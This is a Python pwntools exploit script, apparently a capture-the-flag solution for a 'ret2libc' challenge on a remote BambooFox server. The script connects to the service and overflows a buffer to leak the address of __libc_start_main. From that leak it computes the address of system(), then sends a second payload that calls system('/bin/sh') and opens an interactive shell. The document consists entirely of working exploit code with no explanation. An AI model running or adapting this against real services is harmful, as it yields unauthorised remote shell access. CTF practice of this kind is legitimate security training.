from pwn import *

elf = ELF('ret2libc')
libc = ELF('libc.so.6')

libc_start_main_got = elf.got['__libc_start_main']
main = elf.symbols['main']

#p = process("./ret2libc")
p = remote("bamboofox.cs.nctu.edu.tw", 11002)
p.recvline()
binsh_addr = p.recvline().split()[-1][2:]
puts_addr = p.recvline().split()[-1][2:]

print 'binsh_addr: ' + binsh_addr
print 'puts_addr: ' + puts_addr

#payload = 'A' * 32 + p32(int(puts_addr, 16)) + p32(main) + p32(libc_start_main_got)
payload = flat(['A' * 32, int(puts_addr, 16), main, libc_start_main_got])
with open('./shellcode', 'wb')  as f:
    f.write(payload)
f.close()
p.sendline(payload)
#print p.recv()
libc_start_main_addr = u32(p.recv()[:4])

print 'libc_start_main_addr: ' + hex(libc_start_main_addr)

system_addr = libc_start_main_addr - (libc.symbols['__libc_start_main'] - libc.symbols['system'])

print 'system_addr: ' + hex(system_addr)
#p.interactive()
payload = flat(['A' * 24, system_addr, main, int(binsh_addr, 16)])
with open('./shellcode1', 'wb')  as f:
    f.write(payload)
f.close()
#context.terminal = ['tmux', 'splitw', '-h']
#gdb.attach(proc.pidof(p)[0])
p.sendline(payload)
p.interactive()
